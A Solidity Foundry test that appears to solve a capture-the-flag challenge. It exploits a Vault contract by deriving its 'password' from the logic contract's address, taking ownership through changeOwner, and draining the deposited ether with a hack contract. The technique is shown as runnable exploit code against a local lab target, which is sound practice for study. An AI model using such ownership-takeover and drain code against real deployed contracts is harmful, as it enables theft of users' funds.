// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// import "forge-std/Test.sol";
import {Test, console} from "../lib/forge-std/src/Test.sol";
import "../src/Vault.sol";
import "../src/hack.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;
    hack public hacker;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));
        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);
        {
            hacker = new hack(payable(address(vault)));
            bytes32 passWord = bytes32(uint256(uint160(address(logic))));
            console.logBytes32(passWord);
            bytes memory data = abi.encodeWithSignature("changeOwner(bytes32,address)",passWord,address(hacker));
            address(vault).call(data);
            hacker.attack{value:0.1 ether}();
        }

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}